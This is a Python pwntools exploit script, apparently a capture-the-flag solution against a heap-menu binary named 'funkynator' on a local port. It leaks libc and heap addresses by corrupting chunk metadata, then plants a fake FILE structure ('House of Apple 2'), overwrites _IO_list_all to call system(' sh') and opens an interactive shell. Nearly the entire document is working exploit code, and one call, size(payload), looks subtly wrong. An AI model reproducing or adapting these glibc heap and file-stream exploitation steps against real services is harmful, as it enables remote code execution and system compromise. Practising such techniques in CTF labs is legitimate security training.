from pwn import *
import re

elf = context.binary = ELF("funkynator")
context.arch = "amd64"
libc = elf.libc
# context.log_level = "debug"
# p = gdb.debug(elf.path, aslr=False, gdbscript=gdbscript)
p = remote("localhost", 1337)


def create_chunk(size: bytes, payload: bytes):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b"message", str(size).encode())
    p.sendlineafter(b"message", payload)
    p.sendlineafter(b"your text", b"n")
    return save_Message()


def delete_chunk(chunkId: bytes):
    p.sendlineafter(b">", b"4")
    p.sendlineafter(b":", str(chunkId).encode())


def view_memory(chunkId: bytes):
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b":", str(chunkId).encode())
    return p.recvuntil(b"+")


def enter_processingMenu(chunkId: bytes):
    p.sendlineafter(b">", b"5")
    p.sendlineafter(b":", str(chunkId).encode())


def save_Message():
    p.sendlineafter(b"to memory", b"y")
    p.recvline()
    response = p.recvline()
    match = re.search(rb"location (\d+)", response)
    if match:
        location = int(match.group(1))
        return location
    else:
        return None


def edit_chunk(offset: int, overwritebyte: bytes):
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b":", str(offset).encode())
    p.sendlineafter(b"?", overwritebyte)


def overwrite_mem(chunkId: bytes, beginningIndex: int, overwriteBytes: bytes):
    enter_processingMenu(chunkId=chunkId)
    offset = beginningIndex
    for i in range(len(overwriteBytes)):
        edit_chunk(offset + i, overwriteBytes[i : i + 1])
    p.sendlineafter(b">", b"1")
    save_Message()


p.sendlineafter(b"name", b"Anon")

# LIBC LEAK (we use unsortedbins cause they consolidate)
payload = b"A" * 1047
chunkA = create_chunk(len(payload), payload)
payload = b"A" * 1047
chunkB = create_chunk(len(payload), payload)
payload = b"A" * 1047
chunkC = create_chunk(len(payload), payload)
delete_chunk(chunkB)

payload = b"A"
overwrite_mem(chunkA, 1047, payload)
payload = b"\x11\x11\x11\x11\x11\x11\x11\x11"
overwrite_mem(chunkA, 1048, payload)
overwrite_mem(chunkA, 1048, payload)

libc_leak = view_memory(chunkA)
libc_leak = libc_leak.split(b"\x11")[-1].split(b"\x0a")[0]
libc_leak = int.from_bytes(libc_leak, "little")
if libc_leak.bit_length() < 5 * 8:
    error("ASLR for LibC contains 00")
    exit(1)
info("LibC Main Arena Leak 0x%x", libc_leak)
# offset from main_arena unsortedbin to beginning of libc
libc.address = libc_leak - 0x1E7B20
info("LibC Leak 0x%x", libc.address)
payload = b"\x00"
overwrite_mem(chunkA, 1047, payload)
payload = b"\x30\x00\x00\x00\x00\x00\x00\x00"
overwrite_mem(chunkA, 1048, payload)
payload = b"\x21\x04\x00\x00\x00\x00\x00\x00"
overwrite_mem(chunkA, 1048, payload)
delete_chunk(chunkC)
delete_chunk(chunkA)

# HEAP LEAK
payload = b"A" * 31
chunkA = create_chunk(len(payload), payload)
chunkB = create_chunk(len(payload), payload)
delete_chunk(chunkB)
payload = b"A"
overwrite_mem(chunkA, 31, payload)
payload = b"\x11\x11\x11\x11\x11\x11\x11\x11"
overwrite_mem(chunkA, 32, payload)
overwrite_mem(chunkA, 40, payload)
heap_leak = view_memory(chunkA)
heap_leak = heap_leak.split(b"\x11")[-1].split(b"\x0a")[0]
heap_leak = int.from_bytes(heap_leak, "little")
heap_leak = heap_leak << 12
if heap_leak.bit_length() < 5 * 8:
    error("ASLR for Heap leak contains 00")
    exit(1)
info("Heap Leak 0x%x", heap_leak)

# revert to previous state
payload = b"\x00"
overwrite_mem(chunkA, 31, payload)
payload = b"\x11\x11\x11\x11\x11\x11\x11\x11"
overwrite_mem(chunkA, 32, payload)
payload = b"\x31\x00\x00\x00\x00\x00\x00\x00"
overwrite_mem(chunkA, 40, payload)

# Preparing the house of apple 2 payload
info("Starting House of Apple 2 attack")
fake_file = heap_leak + 0x300  # heap address where you can write this payload
IO_stdfile_0_lock = libc.address + 0x1E7968
system = libc.symbols["system"]
io_wfile_jumps = libc.symbols["_IO_wfile_jumps"]

# --- Build the payload ---
system = libc.symbols["system"]
wfile_jumps = libc.symbols["_IO_wfile_jumps"]
payload = bytearray(0x300)
payload[0x00:0x03] = b" sh"
payload[0x28:0x30] = p64(1)
payload[0x88:0x90] = p64(fake_file + 0x40)
payload[0xA0:0xA8] = p64(fake_file + 0xE0)
payload[0xC0:0xC4] = p32(1)
payload[0xD8:0xE0] = p64(wfile_jumps)
payload[0x100:0x108] = p64(1)
payload[0x1C0:0x1C8] = p64(fake_file + 0x1C8)
payload[0x230:0x238] = p64(system)
# overwrite to make sure no issues with alpha chars
chunk_fake_file = create_chunk(size(payload), payload)
overwrite_mem(chunk_fake_file, 0, payload)

chunkA_heapLoc = heap_leak + 0x2A0
fake_file_chunk = heap_leak + 0x300
io_list_all = libc.symbols["_IO_list_all"]
overwrite_pos = io_list_all - chunkA_heapLoc
payload = p64(fake_file_chunk)

# overwrite (_IO_List_all)
overwrite_mem(chunkA, overwrite_pos, payload)

info("House of Appple 2 done, getting a shell")
p.sendlineafter(b">", b"1")

p.interactive()
